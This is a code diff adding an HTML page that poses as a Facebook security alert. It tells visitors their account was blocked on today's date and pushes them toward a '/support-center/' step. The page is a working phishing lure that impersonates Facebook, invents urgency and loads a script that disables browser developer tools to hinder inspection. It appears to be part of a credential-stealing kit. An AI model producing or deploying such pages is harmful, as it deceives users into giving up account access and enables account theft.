@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Privacy Policy</title>
+    <link rel="icon" href="/assets/image/logofx.png" type="image/x-icon">
+    <script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
+    <link rel="stylesheet" href="syteles.css">
+</head>
+
+<body>
+    <div class="container">
+        <img src="/assets/image/snapedit_1731299162938.png" alt="Security Illustration" class="illustration">
+        <div class="title">The security of your account is at risk.</div>
+        <div class="message">
+            We have temporarily blocked your account because your Facebook Protect settings have been modified.
+        </div>
+        <div class="alert-box">
+            <img src="/assets/image/danger.png" alt="Warning Icon" class="alert-icon">
+            <div class="alert-text">
+                <h2 id="restriction-date">Your page was restricted on <span id="current-date"></span>.</h2>
+                </p>
+                <p>We did this to protect your account from being suspended.</p>
+            </div>
+        </div>
+        <p class="message">We will guide you through some steps to lift the page restriction and unlock your account.
+        </p>
+        <a href="/support-center/" class="continue-button">Continue</a>
+    </div>
+    <script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool@latest'></script>
+    <script>
+        // JavaScript to set the current date
+        const dateElement = document.getElementById("current-date");
+        const options = { year: 'numeric', month: 'long', day: 'numeric' };
+        const currentDate = new Date().toLocaleDateString('en-US', options);
+        dateElement.textContent = currentDate;
+    </script>
+</body>
+
+</html>
